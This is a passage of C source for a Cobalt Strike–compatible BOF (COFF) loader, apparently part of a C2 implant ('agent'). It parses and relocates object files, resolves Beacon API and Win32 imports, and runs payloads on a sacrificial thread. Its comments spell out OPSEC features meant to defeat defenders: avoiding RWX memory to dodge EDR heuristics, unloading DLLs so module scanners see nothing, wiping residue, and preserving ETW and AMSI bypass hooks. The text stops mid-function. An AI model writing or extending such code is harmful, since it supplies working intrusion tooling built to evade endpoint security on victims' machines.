// BOF/COFF Loader — Cobalt Strike BeaconAPI compatible
// Parses COFF format, resolves imports, executes entry point
//
// v7 hardening — OPSEC + correctness:
//
//   I1 (v6 fix kept): COFF_RELOCATION Type field uint8→uint16 (struct was
//      9 bytes instead of 10 → every reloc past #0 read misaligned).
//
//   I2 (v6 fix kept): Type-aware relocation patching — REL32, REL32_N,
//      ADDR64 correctly handled; unknown types non-fatal in data sections.
//
//   I3 (v7 NEW): RWX removal — two-phase memory:
//      Phase 1: VirtualAlloc PAGE_READWRITE (write sections, patch relocs).
//      Phase 2: VirtualProtect PAGE_EXECUTE_READ (execute).
//      No RWX region is EVER visible — eliminates the #1 EDR heuristic.
//
//   I4 (v7 NEW): Per-call context — ALL global mutable state moved into
//      BOF_RUN_CTX (stack-allocated, zeroed on entry). Thread-safe: two
//      concurrent bof_load_and_run() calls no longer share output buffer,
//      bof_base/span, or crash flag. VEH receives BOF_RUN_CTX* via TLS.
//
//   I5 (v7 NEW): Timeout path cleanup — on WAIT_TIMEOUT the output buffer
//      and position are explicitly reset so a stale g_output_pos can never
//      corrupt the next BOF run (was reachable even after the global→ctx
//      move because the ctx lives on the caller's stack for the call).
//
//   I6 (v7 NEW): Section-level memory protection — executable sections get
//      PAGE_EXECUTE_READ; data sections stay PAGE_READONLY after patching.
//      No blanket VirtualProtect on the whole mapping — minimal permission
//      per section.
//
//   I7 (v7 NEW): LoadLibrary residue — DLLs we pulled in are FreeLibrary'd
//      before the BOF memory is wiped, so the process module list returns
//      to its pre-BOF state. A scanner that snapshots modules before/after
//      sees no new entries.
//
// Return codes (unchanged from v6):
//   >= 0  success (output bytes written)
//   -1    invalid COFF / no `go` entry point
//   -2    unsupported relocation in executable section
//   -3    unresolved external symbol
//   -4    BOF crashed (contained — agent survived)
//   -5    internal error (thread create / wait)
//   -6    BOF timed out (> BOF_RUN_TIMEOUT_MS)

// MinGW does not expose __cpuidex as an intrinsic — provide it via asm.
#if defined(__GNUC__)
static inline void __cpuidex_impl(int cpuinfo[4], int leaf, int subleaf) {
    __asm__ __volatile__(
        "cpuid"
        : "=a"(cpuinfo[0]), "=b"(cpuinfo[1]), "=c"(cpuinfo[2]), "=d"(cpuinfo[3])
        : "a"(leaf), "c"(subleaf)
    );
}
#define __cpuidex(cpuinfo, leaf, subleaf) __cpuidex_impl((cpuinfo), (leaf), (subleaf))
#endif

#include <windows.h>
#include <processthreadsapi.h>
#include <stdio.h>
#include <stdarg.h>
#include <string.h>
#include <stdint.h>

// ── COFF structures ──────────────────────────────────────────────────────
#pragma pack(push, 1)
typedef struct {
    uint16_t Machine;
    uint16_t NumberOfSections;
    uint32_t TimeDateStamp;
    uint32_t PointerToSymbolTable;
    uint32_t NumberOfSymbols;
    uint16_t SizeOfOptionalHeader;
    uint16_t Characteristics;
} COFF_HEADER;

typedef struct {
    char     Name[8];
    uint32_t VirtualSize;
    uint32_t VirtualAddress;
    uint32_t SizeOfRawData;
    uint32_t PointerToRawData;
    uint32_t PointerToRelocations;
    uint32_t PointerToLinenumbers;
    uint16_t NumberOfRelocations;
    uint16_t NumberOfLinenumbers;
    uint32_t Characteristics;
} COFF_SECTION;

typedef struct {
    uint32_t VirtualAddress;
    uint32_t SymbolTableIndex;
    uint16_t Type;   // I1 FIX: was uint8_t → 9-byte struct → misaligned reads
} COFF_RELOCATION;

typedef struct {
    union {
        char ShortName[8];
        struct { uint32_t Zeros; uint32_t Offset; } LongName;
    } N;
    uint32_t  Value;
    int16_t   SectionNumber;
    uint16_t  Type;
    uint8_t   StorageClass;
    uint8_t   NumberOfAuxSymbols;
} COFF_SYMBOL;
#pragma pack(pop)

// ── AMD64 relocation types ───────────────────────────────────────────────
#define REL_AMD64_ADDR64  0x0001u
#define REL_AMD64_REL32   0x0004u
#define REL_AMD64_REL32_1 0x0009u
#define REL_AMD64_REL32_2 0x000Au
#define REL_AMD64_REL32_3 0x000Bu
#define REL_AMD64_REL32_4 0x000Cu
#define REL_AMD64_REL32_5 0x000Du

#ifndef IMAGE_SCN_MEM_EXECUTE
#define IMAGE_SCN_MEM_EXECUTE 0x20000000u
#endif
#ifndef IMAGE_SCN_MEM_WRITE
#define IMAGE_SCN_MEM_WRITE 0x80000000u
#endif

// ── Per-call context (I4: replaces all global mutable state) ────────────
//
// BOF_RUN_CTX lives on the stack of bof_load_and_run(). A pointer to it
// is stored in a TLS slot so the VEH (which has no user-data parameter)
// can reach it without touching any global variable.
//
// Every field that was previously a module-level global is here.
// bof_load_and_run() zeroes the struct on entry — no stale values.

typedef struct {
    // Output buffer — written by BeaconOutput/BeaconPrintf
    char   *out_buf;
    int     out_pos;
    int     out_size;

    // BOF code range — used by VEH to decide if RIP is ours
    uint8_t *bof_base;
    SIZE_T   bof_span;

    // Crash flag — set by VEH, read after thread joins
    volatile LONG crashed;

    // SACRIFICIAL THREAD ID — set by bof_thread_trampoline.
    DWORD    bof_thread_id;

    // DLLs we LoadLibrary'd — freed after the run (I7)
    HMODULE loaded_dlls[16];
    int     loaded_dll_count;

    // v8: PRIVATE HEAP — isolates BOF heap operations from the agent's
    // process heap. If the BOF corrupts its heap (buffer overflow, double
    // free, use-after-free), the corruption is contained to THIS heap.
    // The agent's process heap is never touched by BOF allocations.
    // This prevents STATUS_HEAP_CORRUPTION fast-fail exceptions that
    // bypass VEH and kill the entire agent process.
    HANDLE   bof_heap;
} BOF_RUN_CTX;

// TLS slot index — allocated once, reused per-call
static DWORD g_tls_ctx = TLS_OUT_OF_INDEXES;

static void tls_init(void) {
    if (g_tls_ctx == TLS_OUT_OF_INDEXES)
        g_tls_ctx = TlsAlloc();
}

static BOF_RUN_CTX *tls_get_ctx(void) {
    if (g_tls_ctx == TLS_OUT_OF_INDEXES) return NULL;
    return (BOF_RUN_CTX *)TlsGetValue(g_tls_ctx);
}

// ── v8: PRIVATE HEAP WRAPPERS ──────────────────────────────────────────
//
// These intercept the Win32 heap API so BOFs that call HeapAlloc /
// HeapFree / GetProcessHeap operate on a PRIVATE heap, not the process
// heap. This is the #1 fix for agent crashes:
//
//   BEFORE: BOF calls HeapAlloc(GetProcessHeap(), ...) → allocates from
//   the agent's process heap. If the BOF overflows the buffer, it
//   corrupts the agent's heap metadata. The next heap operation by the
//   agent triggers STATUS_HEAP_CORRUPTION (0xC0000374) — a FAST-FAIL
//   exception that BYPASSES VEH and SEH and terminates the process.
//
//   AFTER: GetProcessHeap() returns ctx->bof_heap (our private heap).
//   HeapAlloc/HeapFree operate on that private heap. Any corruption is
//   contained. After the BOF runs, HeapDestroy() wipes the entire heap —
//   no residue, no corruption to the agent.
//
// Community BOFs (Cobalt Strike, TrustedSec, etc.) all use the pattern:
//   HANDLE h = GetProcessHeap();
//   void *p = HeapAlloc(h, 0, size);
//   HeapFree(h, 0, p);
// Our wrappers transparently redirect these to the private heap.

static HANDLE WINAPI bof_GetProcessHeap(void) {
    BOF_RUN_CTX *ctx = tls_get_ctx();
    if (ctx && ctx->bof_heap) return ctx->bof_heap;
    return GetProcessHeap();  // fallback (shouldn't happen)
}

static LPVOID WINAPI bof_HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes) {
    BOF_RUN_CTX *ctx = tls_get_ctx();
    // Always use the private heap regardless of the passed handle —
    // the BOF might have cached GetProcessHeap() result, but we override
    // it here so ALL allocations go to our private heap.
    HANDLE h = (ctx && ctx->bof_heap) ? ctx->bof_heap : hHeap;
    return HeapAlloc(h, dwFlags, dwBytes);
}

static BOOL WINAPI bof_HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem) {
    BOF_RUN_CTX *ctx = tls_get_ctx();
    HANDLE h = (ctx && ctx->bof_heap) ? ctx->bof_heap : hHeap;
    return HeapFree(h, dwFlags, lpMem);
}

static LPVOID WINAPI bof_HeapReAlloc(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes) {
    BOF_RUN_CTX *ctx = tls_get_ctx();
    HANDLE h = (ctx && ctx->bof_heap) ? ctx->bof_heap : hHeap;
    return HeapReAlloc(h, dwFlags, lpMem, dwBytes);
}

// ── BeaconAPI output (reads ctx from TLS) ───────────────────────────────

void BeaconOutput(int type, const char *data, int len) {
    (void)type;
    BOF_RUN_CTX *ctx = tls_get_ctx();
    if (!ctx || !ctx->out_buf || !data || len <= 0) return;
    int avail = ctx->out_size - ctx->out_pos - 1;
    if (avail <= 0) return;
    int n = len < avail ? len : avail;
    memcpy(ctx->out_buf + ctx->out_pos, data, n);
    ctx->out_pos += n;
    ctx->out_buf[ctx->out_pos] = '\0';
}

void BeaconPrintf(int type, const char *fmt, ...) {
    (void)type;
    BOF_RUN_CTX *ctx = tls_get_ctx();
    if (!ctx || !ctx->out_buf || !fmt) return;
    int avail = ctx->out_size - ctx->out_pos - 1;
    if (avail <= 0) return;
    va_list ap;
    va_start(ap, fmt);
    // vsnprintf returns the number of chars that WOULD have been written
    // (not the actual count if truncated). We must clamp to avail to
    // prevent out_pos from jumping past out_size on the next call.
    int w;
#if defined(__GNUC__)
    w = vsnprintf(ctx->out_buf + ctx->out_pos, (size_t)avail, fmt, ap);
#else
    w = _vsnprintf(ctx->out_buf + ctx->out_pos, avail, fmt, ap);
#endif
    va_end(ap);
    if (w > 0) {
        if (w > avail) w = avail;  // clamp to actually-written count
        ctx->out_pos += w;
    }
}

// ── BeaconAPI packed-argument parsing ───────────────────────────────────
typedef struct {
    char *original;
    char *buffer;
    int   size;
    int   length;
} DATAP;

void BeaconDataParse(DATAP *parser, char *buffer, int size) {
    if (!parser) return;
    if (!buffer || size < 4) {
        parser->original = parser->buffer = NULL;
        parser->size = 0; parser->length = 0;
        return;
    }
    parser->original = buffer;
    parser->buffer   = buffer + 4;   // skip 4B argc prefix
    parser->size     = size - 4;
    parser->length   = 0;
}

int BeaconDataInt(DATAP *parser) {
    if (!parser || !parser->buffer || parser->size < 4) return 0;
    int32_t v; memcpy(&v, parser->buffer, 4);
    parser->buffer += 4; parser->size -= 4;
    return (int)v;
}

short BeaconDataShort(DATAP *parser) {
    if (!parser || !parser->buffer || parser->size < 2) return 0;
    int16_t v; memcpy(&v, parser->buffer, 2);
    parser->buffer += 2; parser->size -= 2;
    return (short)v;
}

int BeaconDataLength(DATAP *parser) {
    if (!parser || !parser->buffer || parser->size < 4) {
        if (parser) parser->length = 0;
        return 0;
    }
    int len; memcpy(&len, parser->buffer, 4);
    if (len < 0 || len > parser->size) { parser->length = 0; return 0; }
    parser->length = len;
    return len;
}

char *BeaconDataExtract(DATAP *parser, int *size) {
    if (!parser || !parser->buffer || parser->size < 4) {
        if (size) *size = 0;
        return NULL;
    }
    int len; memcpy(&len, parser->buffer, 4);
    parser->buffer += 4; parser->size -= 4;
    if (len < 0 || len > parser->size) len = parser->size > 0 ? parser->size : 0;
    parser->length = len;
    char *out = parser->buffer;
    parser->buffer += len; parser->size -= len;
    if (size) *size = len;
    return out;
}

// ── BeaconAPI misc helpers ───────────────────────────────────────────────

BOOL BeaconUseToken(HANDLE token) {
    if (!token) return FALSE;
    return SetThreadToken(NULL, (HANDLE)token);
}
void BeaconRevertToken(void) { RevertToSelf(); }

BOOL BeaconIsAdmin(void) {
    BOOL admin = FALSE;
    PSID g = NULL;
    SID_IDENTIFIER_AUTHORITY auth = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&auth, 2, SECURITY_BUILTIN_DOMAIN_RID,
            DOMAIN_ALIAS_RID_ADMINS, 0,0,0,0,0,0, &g)) {
        if (!CheckTokenMembership(NULL, g, &admin)) admin = FALSE;
        FreeSid(g);
    }
    return admin;
}

BOOL BeaconGetSpawnTo(BOOL x86, char *buf, int len) {
    if (!buf || len <= 0) return FALSE;
    char windir[MAX_PATH + 1];
    UINT n = GetWindowsDirectoryA(windir, MAX_PATH);
    if (!n || n >= MAX_PATH) return FALSE;
    int w = _snprintf(buf, (size_t)len - 1,
        x86 ? "%s\\Sysnative\\cmd.exe" : "%s\\System32\\cmd.exe", windir);
    if (w <= 0 || w >= len) return FALSE;
    buf[w] = '\0';
    return TRUE;
}

int toWideChar(char *mb, wchar_t *uni, int maxUni) {
    if (!mb || !uni || maxUni <= 0) return 0;
    int r = MultiByteToWideChar(CP_UTF8, 0, mb, -1, uni, maxUni);
    return r > 0 ? r - 1 : 0;
}

void BeaconGetCpuId(uint32_t leaf, uint32_t sub,
                    uint32_t *eax, uint32_t *ebx, uint32_t *ecx, uint32_t *edx) {
    int info[4];
    __cpuidex(info, (int)leaf, (int)sub);
    *eax = (uint32_t)info[0]; *ebx = (uint32_t)info[1];
    *ecx = (uint32_t)info[2]; *edx = (uint32_t)info[3];
}

DWORD BeaconGetCurrentThreadId(void) { return GetCurrentThreadId(); }
DWORD BeaconGetProcessId(void)       { return GetCurrentProcessId(); }
void *BeaconGetThreadContext(HANDLE h, void *c) { GetThreadContext(h,(CONTEXT*)c); return c; }
BOOL  BeaconSetThreadContext(HANDLE h, void *c) { return SetThreadContext(h,(CONTEXT*)c); }

// ── DLL resolution (I7: tracked for FreeLibrary after run) ──────────────

static const char *BOF_DLLS[] = {
    "kernel32.dll","ntdll.dll","user32.dll","advapi32.dll",
    "ws2_32.dll","msvcrt.dll",
    "iphlpapi.dll","netapi32.dll","dnsapi.dll","gdi32.dll","shell32.dll",
    NULL
};

static HMODULE ctx_resolve_module(BOF_RUN_CTX *ctx, const char *name) {
    HMODULE h = GetModuleHandleA(name);
    if (h) return h;                         // already loaded — not ours
    h = LoadLibraryA(name);
    if (h && ctx->loaded_dll_count < 16) {
        ctx->loaded_dlls[ctx->loaded_dll_count++] = h;
    }
    return h;
}

static void ctx_release_dlls(BOF_RUN_CTX *ctx) {
    for (int i = 0; i < ctx->loaded_dll_count; i++) {
        FreeLibrary(ctx->loaded_dlls[i]);
        ctx->loaded_dlls[i] = NULL;
    }
    ctx->loaded_dll_count = 0;
}

// ── Relocation patching (I2: type-aware) ────────────────────────────────

static int patch_reloc(uint8_t *site, uint16_t type, uint64_t target) {
    switch (type) {
    case REL_AMD64_ADDR64:
        *(uint64_t *)(void *)site = target;
        return 0;
    case REL_AMD64_REL32:
    case REL_AMD64_REL32_1: case REL_AMD64_REL32_2: case REL_AMD64_REL32_3:
    case REL_AMD64_REL32_4: case REL_AMD64_REL32_5: {
        int extra = (type >= REL_AMD64_REL32_1) ? (int)(type - REL_AMD64_REL32_1)+1 : 0;
        int64_t rel = (int64_t)target - ((int64_t)(intptr_t)site + 4 + extra);
        if (rel < INT32_MIN || rel > INT32_MAX) return -1;
        *(int32_t *)(void *)site = (int32_t)rel;
        return 0;
    }
    default:
        return -1;
    }
}

// ── Compiler-support stub (no-op chkstk) ────────────────────────────────
static void bof_chkstk_stub(void) {}

// ── BOF crash containment (v6 kept, updated for per-call ctx via TLS) ───
//
// The VEH checks whether the faulting RIP is inside the mapped BOF range
// (read from the per-call ctx stored in TLS). If yes, it redirects to
// bof_crash_recovery() which calls ExitThread — killing only the sacrificial
// thread. The loader's WaitForSingleObject wakes and takes the -4 path.

static void __attribute__((noinline)) bof_crash_recovery(void) {
    ExitThread(0);
}

static LONG CALLBACK bof_veh(PEXCEPTION_POINTERS ep) {
    BOF_RUN_CTX *ctx = tls_get_ctx();
    if (!ctx || !ctx->bof_base || !ep || !ep->ContextRecord || !ep->ExceptionRecord)
        return EXCEPTION_CONTINUE_SEARCH;

    // CRITICAL: Don't catch EXCEPTION_SINGLE_STEP (hardware breakpoint fires).
    // These are used by ETW (DR1), AMSI (DR2), and Phantom sleep mask (DR0)
    // VEH handlers. If we catch them here, those bypasses break.
    // Pass them through to the appropriate VEH handler.
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    DWORD64 rip = ep->ContextRecord->Rip;

    // CASE 1: Crash inside the BOF's own code (original behavior).
    // This is the standard case — the BOF code itself faulted.
    if (rip >= (DWORD64)(uintptr_t)ctx->bof_base &&
        rip <  (DWORD64)(uintptr_t)(ctx->bof_base + ctx->bof_span)) {
        InterlockedExchange(&ctx->crashed, 1);
        BeaconPrintf(0,
            "[BOF] exception 0x%08lX at rip %p — contained (in BOF code)\n",
            (unsigned long)ep->ExceptionRecord->ExceptionCode,
            (void *)(uintptr_t)rip);
        ep->ContextRecord->Rip = (DWORD64)(uintptr_t)&bof_crash_recovery;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    // CASE 2: Crash inside a Win32 API called from the BOF.
    // The BOF called a GDI/user32/kernel32 function (e.g., BitBlt, GetDIBits,
    // CreateDesktopW) and the crash happened INSIDE that DLL — RIP is NOT in
    // the BOF code range. Without this case, the crash would propagate as
    // unhandled and kill the entire agent.
    //
    // We catch it ONLY if we're on the sacrificial thread (bof_thread_id
    // matches). The beacon thread also has TLS ctx set (for BeaconPrintf in
    // error paths), but we must NOT catch crashes on the beacon thread —
    // those are from the beacon loop itself and should propagate normally.
    if (ctx->bof_thread_id != 0 && GetCurrentThreadId() == ctx->bof_thread_id) {
        InterlockedExchange(&ctx->crashed, 1);
        BeaconPrintf(0,
            "[BOF] exception 0x%08lX at rip %p — contained (in Win32 API call from BOF)\n",
            (unsigned long)ep->ExceptionRecord->ExceptionCode,
            (void *)(uintptr_t)rip);
        ep->ContextRecord->Rip = (DWORD64)(uintptr_t)&bof_crash_recovery;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

// ── Sacrificial-thread trampoline ───────────────────────────────────────

typedef struct {
    void        (*entry)(const char *, int);
    const char  *args;
    int          args_len;
    volatile LONG done;
    BOF_RUN_CTX *ctx;   // pointer back so thread can write output
} BOF_THREAD_CTX;

static DWORD WINAPI bof_thread_trampoline(LPVOID p) {
    BOF_THREAD_CTX *tc = (BOF_THREAD_CTX *)p;
    // Install per-call ctx into this thread's TLS so BeaconOutput/Printf
    // and the VEH can find it without any global variable.
    if (g_tls_ctx != TLS_OUT_OF_INDEXES)
        TlsSetValue(g_tls_ctx, tc->ctx);
    // Record this thread's ID so bof_veh can catch crashes in Win32 APIs
    // called from the BOF (CASE 2 in bof_veh). Without this, only crashes
    // inside the BOF's own code are caught; crashes inside BitBlt/GetDIBits
    // (in gdi32.dll) propagate and kill the agent.
    tc->ctx->bof_thread_id = GetCurrentThreadId();
    tc->entry(tc->args, tc->args_len);
    RevertToSelf();
    InterlockedExchange(&tc->done, 1);
    return 0;
}

#define BOF_RUN_TIMEOUT_MS (2 * 60 * 1000)

// ── Main entry point ─────────────────────────────────────────────────────
//
// Non-static: this symbol must be visible for Rust FFI linkage.
// (static = internal linkage = undefined reference at link time)
//
// I3: two-phase memory — RW alloc, then RX flip before execution.
// I4: all mutable state in per-call BOF_RUN_CTX on the stack.
// I5: explicit ctx reset on timeout path.
// I6: per-section VirtualProtect after patching.
// I7: FreeLibrary before wipe.

int bof_load_and_run(
    const uint8_t *coff_data, size_t coff_size,
    const uint8_t *args_data, size_t args_size,
    char *output_buf, size_t output_buf_size)
{
    // ── Initialise per-call context (I4) ──────────────────────────────
    BOF_RUN_CTX ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.out_buf  = output_buf;
    ctx.out_size = (int)output_buf_size;

    tls_init();
    // Install ctx on the CALLING thread so BeaconPrintf in error paths
    // (before the sacrificial thread starts) can write output.
    if (g_tls_ctx != TLS_OUT_OF_INDEXES)
        TlsSetValue(g_tls_ctx, &ctx);

    // ── Input validation ──────────────────────────────────────────────
    if (!coff_data || coff_size < sizeof(COFF_HEADER)) return -1;
    if (args_size > (1u << 20)) return -1;   // 1MB sanity cap

    const COFF_HEADER *hdr = (const COFF_HEADER *)coff_data;
    if (hdr->Machine != 0x8664) return -1;

    // v8: Section count sanity — normal BOFs have 2-5 sections
    if (hdr->NumberOfSections == 0 || hdr->NumberOfSections > 32) {
        if (ctx.out_buf && ctx.out_size > 0)
            snprintf(ctx.out_buf, ctx.out_size,
                "[BOF] invalid section count: %d (expected 1-32)\n",
                hdr->NumberOfSections);
        return -1;
    }

    // v8: BOUNDS CHECKING — validate COFF offsets before use.
    // A malformed COFF (or one compiled with wrong flags) can have offsets
    // that point past the end of coff_data. Without these checks, the
    // beacon thread would access-violate during setup (before the VEH
    // is installed) and kill the entire agent.
    const uint8_t *sections_start = coff_data + sizeof(COFF_HEADER) + hdr->SizeOfOptionalHeader;
    const uint8_t *sections_end = sections_start + (size_t)hdr->NumberOfSections * sizeof(COFF_SECTION);
    if (sections_end > coff_data + coff_size) {
        if (ctx.out_buf && ctx.out_size > 0)
            snprintf(ctx.out_buf, ctx.out_size,
                "[BOF] section table overflows COFF data\n");
        return -1;
    }
    // Validate symbol table pointer
    if (hdr->PointerToSymbolTable > 0 && hdr->NumberOfSymbols > 0) {
        const uint8_t *sym_end = coff_data + hdr->PointerToSymbolTable
                                + (size_t)hdr->NumberOfSymbols * sizeof(COFF_SYMBOL);
        if (sym_end > coff_data + coff_size) {
            if (ctx.out_buf && ctx.out_size > 0)
                snprintf(ctx.out_buf, ctx.out_size,
                    "[BOF] symbol table overflows COFF data\n");
            return -1;
        }
    }

    const COFF_SECTION *sections =
        (const COFF_SECTION *)sections_start;
    const uint8_t *sym_table  = coff_data + hdr->PointerToSymbolTable;
    const char    *str_table  = (const char *)(sym_table + (size_t)hdr->NumberOfSymbols * sizeof(COFF_SYMBOL));

    // v8: Validate each section's raw data and relocation pointers
    for (int i = 0; i < hdr->NumberOfSections; i++) {
        if (sections[i].SizeOfRawData > 0) {
            if (sections[i].PointerToRawData + sections[i].SizeOfRawData > coff_size) {
                if (ctx.out_buf && ctx.out_size > 0)
                    snprintf(ctx.out_buf, ctx.out_size,
                        "[BOF] section %d raw data overflows COFF\n", i);
                return -1;
            }
        }
        if (sections[i].NumberOfRelocations > 0) {
            if (sections[i].PointerToRelocations + (size_t)sections[i].NumberOfRelocations * sizeof(COFF_RELOCATION) > coff_size) {
                if (ctx.out_buf && ctx.out_size > 0)
                    snprintf(ctx.out_buf, ctx.out_size,
                        "[BOF] section %d relocations overflow COFF\n", i);
                return -1;
            }
        }
    }

    // ── v8: Create PRIVATE HEAP for BOF allocations ──────────────────
    // This isolates all BOF heap operations from the agent's process heap.
    // If the BOF corrupts its heap, the corruption is contained to THIS heap.
    // HeapDestroy() at the end wipes everything — no residue.
    ctx.bof_heap = HeapCreate(0, 0, 0);
    if (!ctx.bof_heap) {
        if (ctx.out_buf && ctx.out_size > 0)
            snprintf(ctx.out_buf, ctx.out_size,
                "[BOF] failed to create private heap\n");
        return -9;
    }

    // ── Compute total mapping size ─────────────────────────────────────
    SIZE_T total = 0;
    for (int i = 0; i < hdr->NumberOfSections; i++) {
        SIZE_T end = sections[i].VirtualAddress + sections[i].SizeOfRawData;
        if (end > total) total = end;
    }
    if (total == 0) return -1;

    // ── Phase 1: Allocate RW memory (I3 — no RWX) ─────────────────────
    uint8_t *mem = (uint8_t *)VirtualAlloc(
        NULL, total, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return -1;

    // ── Map sections ──────────────────────────────────────────────────
    for (int i = 0; i < hdr->NumberOfSections; i++) {
        if (sections[i].SizeOfRawData > 0 &&
            sections[i].PointerToRawData + sections[i].SizeOfRawData <= coff_size) {
            memcpy(mem + sections[i].VirtualAddress,
                   coff_data + sections[i].PointerToRawData,
                   sections[i].SizeOfRawData);
        }
        if (sections[i].SizeOfRawData < sections[i].VirtualSize) {
            memset(mem + sections[i].VirtualAddress + sections[i].SizeOfRawData, 0,
                   sections[i].VirtualSize - sections[i].SizeOfRawData);
        }
    }

    // ── Process internal relocations (I2: type-aware) ──────────────────
    int exec_fail = 0;
    for (int i = 0; i < hdr->NumberOfSections; i++) {
        if (!sections[i].NumberOfRelocations) continue;
        const COFF_RELOCATION *relocs =
            (const COFF_RELOCATION *)(coff_data + sections[i].PointerToRelocations);
        for (int j = 0; j < sections[i].NumberOfRelocations; j++) {
            // v8: bounds check SymbolTableIndex
            if (relocs[j].SymbolTableIndex >= hdr->NumberOfSymbols) continue;
            const COFF_SYMBOL *sym =
                (const COFF_SYMBOL *)(sym_table + (size_t)relocs[j].SymbolTableIndex * sizeof(COFF_SYMBOL));
            if (sym->SectionNumber <= 0) continue;
            // v8: bounds check section number
            if (sym->SectionNumber > hdr->NumberOfSections) continue;
            // v8: bounds check relocation site within the allocated mapping
            uint32_t site_offset = sections[i].VirtualAddress + relocs[j].VirtualAddress;
            if (site_offset >= total) continue;  // out of bounds — skip
            uint8_t *site = mem + site_offset;
            uint64_t addr = (uint64_t)(uintptr_t)(
                mem + sections[sym->SectionNumber - 1].VirtualAddress + sym->Value);
            if (patch_reloc(site, relocs[j].Type, addr) != 0)
                if (sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
                    exec_fail = 1;
        }
    }
    if (exec_fail) {
        if (ctx.out_buf && ctx.out_size > 0)
            snprintf(ctx.out_buf, ctx.out_size,
                "[BOF] unsupported relocation in executable section\n");
        memset(mem, 0, total);
        VirtualFree(mem, 0, MEM_RELEASE);
        if (ctx.bof_heap) { HeapDestroy(ctx.bof_heap); ctx.bof_heap = NULL; }
        if (g_tls_ctx != TLS_OUT_OF_INDEXES) TlsSetValue(g_tls_ctx, NULL);
        return -2;
    }

    // ── Resolve external symbols ───────────────────────────────────────
    char missed[256] = {0};
    int  unresolved  = 0;

    for (uint32_t s = 0; s < hdr->NumberOfSymbols; s++) {
        const COFF_SYMBOL *sym =
            (const COFF_SYMBOL *)(sym_table + s * sizeof(COFF_SYMBOL));
        if (sym->SectionNumber != 0) continue;
        if (sym->StorageClass  != 2) continue;

        const char *sname;
        char nbuf[256];
        if (sym->N.ShortName[0]) {
            memcpy(nbuf, sym->N.ShortName, 8); nbuf[8] = '\0'; sname = nbuf;
        } else {
            sname = str_table + sym->N.LongName.Offset;
        }
        const char *lookup = sname;
        if (strncmp(lookup, "__imp_", 6) == 0) lookup += 6;

        void *addr = NULL;

        // BeaconAPI
        if      (!strcmp(lookup,"BeaconOutput"))           addr=(void*)BeaconOutput;
        else if (!strcmp(lookup,"BeaconPrintf"))           addr=(void*)BeaconPrintf;
        else if (!strcmp(lookup,"BeaconDataParse"))        addr=(void*)BeaconDataParse;
        else if (!strcmp(lookup,"BeaconDataInt"))          addr=(void*)BeaconDataInt;
        else if (!strcmp(lookup,"BeaconDataShort"))        addr=(void*)BeaconDataShort;
        else if (!strcmp(lookup,"BeaconDataLength"))       addr=(void*)BeaconDataLength;
        else if (!strcmp(lookup,"BeaconDataExtract"))      addr=(void*)BeaconDataExtract;
        else if (!strcmp(lookup,"BeaconUseToken"))         addr=(void*)BeaconUseToken;
        else if (!strcmp(lookup,"BeaconRevertToken"))      addr=(void*)BeaconRevertToken;
        else if (!strcmp(lookup,"BeaconIsAdmin"))          addr=(void*)BeaconIsAdmin;
        else if (!strcmp(lookup,"BeaconGetSpawnTo"))       addr=(void*)BeaconGetSpawnTo;
        else if (!strcmp(lookup,"toWideChar"))             addr=(void*)toWideChar;
        else if (!strcmp(lookup,"BeaconGetCpuId"))         addr=(void*)BeaconGetCpuId;
        else if (!strcmp(lookup,"BeaconGetCurrentThreadId")) addr=(void*)BeaconGetCurrentThreadId;
        else if (!strcmp(lookup,"BeaconGetProcessId"))     addr=(void*)BeaconGetProcessId;
        else if (!strcmp(lookup,"BeaconGetThreadContext")) addr=(void*)BeaconGetThreadContext;
        else if (!strcmp(lookup,"BeaconSetThreadContext")) addr=(void*)BeaconSetThreadContext;
        // v8: Heap interception — redirect to private heap wrappers
        else if (!strcmp(lookup,"GetProcessHeap"))         addr=(void*)bof_GetProcessHeap;
        else if (!strcmp(lookup,"HeapAlloc"))              addr=(void*)bof_HeapAlloc;
        else if (!strcmp(lookup,"HeapFree"))               addr=(void*)bof_HeapFree;
        else if (!strcmp(lookup,"HeapReAlloc"))            addr=(void*)bof_HeapReAlloc;
        // Compiler helpers
        else if (!strcmp(lookup,"GoString") || !strcmp(lookup,"_go")) continue;
        else if (!strcmp(lookup,"___chkstk_ms") || !strcmp(lookup,"__chkstk") ||
                 !strcmp(lookup,"_alloca_probe"))          addr=(void*)bof_chkstk_stub;
        else {
            // Win32 / CRT
            for (int d = 0; BOF_DLLS[d]; d++) {
                HMODULE m = ctx_resolve_module(&ctx, BOF_DLLS[d]);
                if (m) { addr = (void*)GetProcAddress(m, lookup); if (addr) break; }
            }
        }

        if (!addr) {
            if (!unresolved) snprintf(missed, sizeof(missed), "%s", lookup);
            unresolved++;
            continue;
        }

        // Patch all relocations referencing this symbol (type-aware)
        for (int i = 0; i < hdr->NumberOfSections; i++) {
            if (!sections[i].NumberOfRelocations) continue;
            const COFF_RELOCATION *relocs =
                (const COFF_RELOCATION *)(coff_data + sections[i].PointerToRelocations);
            for (int j = 0; j < sections[i].NumberOfRelocations; j++) {
                const COFF_SYMBOL *rsym =
                    (const COFF_SYMBOL *)(sym_table + relocs[j].SymbolTableIndex * sizeof(COFF_SYMBOL));
                if (rsym == sym ||
                    (rsym->N.ShortName[0] && !memcmp(rsym->N.ShortName, sym->N.ShortName, 8))) {
                    uint8_t *pa = mem + sections[i].VirtualAddress + relocs[j].VirtualAddress;
                    patch_reloc(pa, relocs[j].Type, (uint64_t)(uintptr_t)addr);
                }
            }
        }
    }

    if (unresolved > 0) {
        if (ctx.out_buf && ctx.out_size > 0)
            snprintf(ctx.out_buf, ctx.out_size,
                "[BOF] %d unresolved external(s) — first: %s\n", unresolved, missed);
        ctx_release_dlls(&ctx);
        memset(mem, 0, total);
        VirtualFree(mem, 0, MEM_RELEASE);
        if (ctx.bof_heap) { HeapDestroy(ctx.bof_heap); ctx.bof_heap = NULL; }
